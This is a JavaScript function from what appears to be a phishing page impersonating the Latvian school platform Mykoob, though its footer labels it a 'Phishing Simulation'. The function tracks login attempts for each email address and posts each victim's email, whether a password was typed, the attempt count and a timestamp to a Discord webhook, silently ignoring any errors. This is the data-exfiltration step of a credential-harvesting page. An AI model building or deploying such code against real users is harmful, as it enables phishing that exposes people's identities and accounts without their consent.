function sendToDiscord(email, action, passwordProvided) {
    if (!attemptTracker[email]) {
        attemptTracker[email] = 0;
    }
    attemptTracker[email]++;
    
    const embed = {
        embeds: [{
            title: `🔐 ${action}`,
            color: 0xff4444,
            fields: [
                {
                    name: '📧 E-pasts',
                    value: email || 'Nav norādīts',
                    inline: true
                },
                {
                    name: '🔑 Parole ievadīta?',
                    value: passwordProvided ? '✅ Jā' : '❌ Nē',
                    inline: true
                },
                {
                    name: '🔄 Mēģinājums #',
                    value: attemptTracker[email].toString(),
                    inline: true
                },
                {
                    name: '🕐 Laiks',
                    value: new Date().toLocaleString('lv-LV'),
                    inline: false
                }
            ],
            footer: {
                text: 'Mykoob Phishing Simulation'
            }
        }]
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed)
    }).catch(err => console.log('Webhook error (ignored):', err));
}
